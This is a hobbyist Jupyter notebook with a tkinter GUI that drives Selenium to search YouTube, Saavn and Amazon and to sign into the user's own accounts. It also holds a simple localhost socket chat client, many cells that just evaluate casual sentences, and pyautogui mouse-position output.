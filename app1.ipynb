{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tkinter as tk\n",
    "\n",
    "from tkinter import font\n",
    "\n",
    "from selenium import webdriver\n",
    "\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "\n",
    "from time import sleep\n",
    "\n",
    "class Youtube:\n",
    "    def __init__(self,songname):\n",
    "        self.driver = webdriver.Chrome(\"C:/Users/H/Downloads/chromedriver.exe\")\n",
    "        self.driver.get(\"https://www.youtube.com/results?search_query=\"+str(songname))\n",
    "        self.driver.find_element_by_xpath(\"//*[@id='video-title']/yt-formatted-string\").click()\n",
    "        \n",
    "        \n",
    "class saavn:\n",
    "    def __init__(self,songname):\n",
    "        self.browser = webdriver.Chrome(\"C:/Users/H/anaconda3/Lib/site-packages/selenium/webdriver/chrome/chromedriver_win32/chromedriver.exe\")\n",
    "        self.browser.get(\"https://www.saavn.com/\")\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[2]/div[2]/div[1]/span/input[2]\").send_keys(songname)\n",
    "        sleep(2)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[2]/div[2]/div[1]/span/div/div/div/div/div/div[1]/div[2]/div/div[2]/h3/strong\").click()\n",
    "        sleep(4)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[8]/div/section/div/section/div/div[2]/div/div/button\").click()\n",
    "\n",
    "\n",
    "class yourplaylist:\n",
    "    def __init__(self,username,pw):\n",
    "        self.driver = webdriver.Chrome(\"C:/Users/H/anaconda3/Lib/site-packages/selenium/webdriver/chrome/chromedriver_win32/chromedriver.exe\")\n",
    "       \n",
    "        self.driver.get(\"https://www.youtube.com\")\n",
    "        sleep(1)\n",
    "        self.driver.find_element_by_xpath(\"//*[@id='buttons']/ytd-button-renderer/a\").click()\n",
    "        self.driver.find_element_by_xpath(\"//*[@id='identifierId']\").send_keys(username)\n",
    "        self.driver.find_element_by_xpath(\"//*[@id='identifierNext']\").click()\n",
    "        \n",
    "        sleep(4)\n",
    "        self.driver.find_element_by_xpath(\"//*[@id='password']/div[1]/div/div[1]/input\").send_keys(pw)\n",
    "        sleep(1)\n",
    "        self.driver.find_element_by_xpath(\"//*[@id='passwordNext']/span/span\").click()\n",
    "        sleep(2)\n",
    "        self.driver.find_element_by_xpath(\"//*[@id='guide-button']\").click()\n",
    "        sleep(1)\n",
    "        self.driver.find_element_by_xpath(\"/html/body/ytd-app/div/app-drawer/div[2]/div/div[2]/div[2]/ytd-guide-renderer/div[1]/ytd-guide-section-renderer[1]/div/ytd-guide-collapsible-section-entry-renderer/div[2]/ytd-guide-entry-renderer[4]/a\").click()\n",
    "        sleep(1)\n",
    "        self.driver.find_element_by_xpath(\"/html/body/ytd-app/div/ytd-page-manager/ytd-browse[2]/ytd-playlist-sidebar-renderer/div/ytd-playlist-sidebar-primary-info-renderer/ytd-playlist-thumbnail/a/div[2]/ytd-thumbnail-overlay-side-panel-renderer\").click()\n",
    "\n",
    "height = 800\n",
    "width = 800\n",
    "\n",
    "root = tk.Tk()\n",
    "\n",
    "canvas = tk.Canvas(root,width = width,height = height)\n",
    "canvas.pack()\n",
    "pic = tk.PhotoImage(file = \"C:/Users/H/Pictures/Saved Pictures/output-onlinepngtools (7).png\")\n",
    "canvas.create_image(0,0,image = pic,anchor = 'nw')\n",
    "ric = tk.PhotoImage(file = \"C:/Users/H/Pictures/Saved Pictures/utube1 (2).png\")\n",
    "\n",
    "label = tk.Label(canvas,bg = 'black',text = \"LIKED VIDEOS IN YOUR YOUTUBE\",fg = 'white',font = ('Gabriola',32))\n",
    "label.place(relx = .2,rely = .05,relwidth = .62,relheight = .04)\n",
    "\n",
    "label1 = tk.Label(canvas,bg = 'black',text = \"Enter gmail\",fg = 'white',font = ('Gabriola',28))\n",
    "label1.place(relx = .2,rely = .13,relwidth = .2,relheight = .05)\n",
    "\n",
    "entry = tk.Entry(canvas,font = ('Gabriola',20))\n",
    "entry.place(relx = .45,rely = .13,relwidth = .3,relheight = .05)\n",
    "\n",
    "label2 = tk.Label(canvas,bg = 'black',text = \"Password\",fg = 'white',font = ('Gabriola',28))\n",
    "label2.place(relx = .2,rely = .23,relwidth = .2,relheight = .05)\n",
    "\n",
    "button1 = tk.Button(canvas,bg = 'black',fg = 'red',image = ric,font = ('Gabriola',20),command = lambda: Youtube(entry2.get()))\n",
    "button1.place(relx = .16,rely = .67,relwidth = .1,relheight = .08,anchor = 'nw')\n",
    "\n",
    "button2 = tk.Button(canvas,bg = 'black',fg = 'red',text = 'Play in Saavn',font = ('Gabriola',20),command = lambda: saavn(entry3.get()))\n",
    "button2.place(relx = .688,rely = .7,relwidth = .3,relheight = .05)\n",
    "\n",
    "\n",
    "entry1 = tk.Entry(canvas,font = ('Gabriola',20),show = '*')\n",
    "entry1.place(relx = .45,rely = .23,relwidth = .3,relheight = .05)\n",
    "\n",
    "entry2 = tk.Entry(canvas,font = ('Gabriola',18))\n",
    "entry2.place(relx = .03,rely = .76,relwidth = .37,relheight = .04)\n",
    "\n",
    "entry3 = tk.Entry(canvas,font = ('Gabriola',20))\n",
    "entry3.place(relx = .616,rely = .76,relwidth = .37,relheight = .04)\n",
    "\n",
    "button = tk.Button(canvas,bg = 'black',text = 'Sign In',fg = 'white',command = lambda: yourplaylist(entry.get(),entry1.get()))\n",
    "button.place(relx = .6,rely = .30,relwidth = .2,relheight = .03 )\n",
    "\n",
    "root.mainloop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class amazon:\n",
    "    def __init__(self,username,pw):\n",
    "        self.browser = webdriver.Chrome(\"C:/Users/H/anaconda3/Lib/site-packages/selenium/webdriver/chrome/chromedriver_win32/chromedriver.exe\")\n",
    "        self.browser.get(\"https://www.amazon.in\")\n",
    "        sleep(1)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[1]/header/div/div[1]/div[2]/div/a[2]/span[2]\").click()\n",
    "        sleep(1)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div[1]/form/div/div/div/div[1]/input[1]\").send_keys(username)\n",
    "        sleep(1)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div[1]/form/div/div/div/div[2]/span/span\").click()\n",
    "        sleep(1)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[1]/div[1]/div[2]/div/div[2]/div[1]/div/div/form/div/div[1]/input\").send_keys(pw)\n",
    "        sleep(1)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[1]/div[1]/div[2]/div/div[2]/div[1]/div/div/form/div/div[2]/span/span/input\").click()\n",
    "        \n",
    "        \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class amazon:\n",
    "    def __init__(self,search):\n",
    "        self.browser = webdriver.Chrome(\"C:/Users/H/anaconda3/Lib/site-packages/selenium/webdriver/chrome/chromedriver_win32/chromedriver.exe\")\n",
    "        self.browser.get(\"https://www.amazon.in\")\n",
    "        sleep(1)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[1]/header/div/div[1]/div[3]/div/form/div[3]/div[1]/input\").send_keys(search)\n",
    "        sleep(1)\n",
    "        self.browser.find_element_by_xpath(\"/html/body/div[1]/header/div/div[1]/div[3]/div/form/div[2]/div/input\").click()\n",
    "        sleep(1)\n",
    "\n",
    "        \n",
    "        \n",
    "        \n",
    "amazon(\"greek god bracelet\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Server:  Coonection accepted from server id DESKTOP-U8TA4AV\n",
      "Client: Hlo\n",
      "Server:  bye\n"
     ]
    }
   ],
   "source": [
    "#CLient\n",
    "import socket\n",
    "\n",
    "client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
    "\n",
    "host = socket.gethostname()\n",
    "\n",
    "port = 9009\n",
    "\n",
    "client.connect((host,port))\n",
    "\n",
    "while True:\n",
    "    msg = client.recv(1024)\n",
    "    msg = msg.decode()\n",
    "    print(\"Server: \",msg)\n",
    "    if (msg == 'bye'):\n",
    "        break\n",
    "    msg = input(\"Client: \")\n",
    "    msg = msg.encode()\n",
    "    client.send(msg)\n",
    "    if msg == 'bye':\n",
    "        break\n",
    "client.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"I had it in my mind but doing it didn't help\""
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"I had it in my mind but doing it didn't help\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"My vision's being compromised\""
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"My vision's being compromised\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"I think I'm just a play date to you\""
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"I think I'm just a play date to you\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"I'll probably do it eventually anyway\""
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"I'll probably do it eventually anyway\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Brookyln heights'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"Brookyln heights\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'We can work out on the team name later'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"We can work out on the team name later\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"That's a cat\""
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"That's a cat\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'You guys wanna eat here'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"You guys wanna eat here\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"I'm good\""
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"I'm good\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'She said Making you is the best thing that god had done'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"She said Making you is the best thing that god had done\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'I said thank u'"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"I said thank u\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"No problem I'll be there for u\""
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"No problem I'll be there for u\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'You can go but be safe'"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"You can go but be safe\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pyautogui as py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "py.move(1000,1000)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"You've travelled a lot, why is this special\""
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"You've travelled a lot, why is this special\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Fine play well it opens for your selection cause there will be bcci selectors as referees'"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"Fine play well it opens for your selection cause there will be bcci selectors as referees\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Press Ctrl-C to quit.\n",
      "X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (247, 247, 24X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (165, 227, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1022 Y:  824 RGB: (255, 255, 25X: 1025 Y:  796 RGB: (255, 255, 25X: 1032 Y:  724 RGB: (255, 255, 25X: 1032 Y:  671 RGB: (255, 255, 25X: 1032 Y:  636 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1035 Y:  627 RGB: (255, 255, 25X: 1033 Y:  625 RGB: (255, 255, 25X:  991 Y:  603 RGB: (247, 247, 24X:  966 Y:  593 RGB: (247, 247, 24X:  949 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (247, 247, 24X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (132,   0,   X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  947 Y:  588 RGB: (255, 255, 25X:  945 Y:  580 RGB: (255, 255, 25X:  932 Y:  528 RGB: (255, 255, 25X:  926 Y:  497 RGB: (255, 255, 25X:  922 Y:  490 RGB: (255, 255, 25X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  921 Y:  488 RGB: (132,   0,   X:  912 Y:  531 RGB: (255, 255, 25X:  905 Y:  561 RGB: (255, 255, 25X:  903 Y:  564 RGB: (255, 255, 19X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 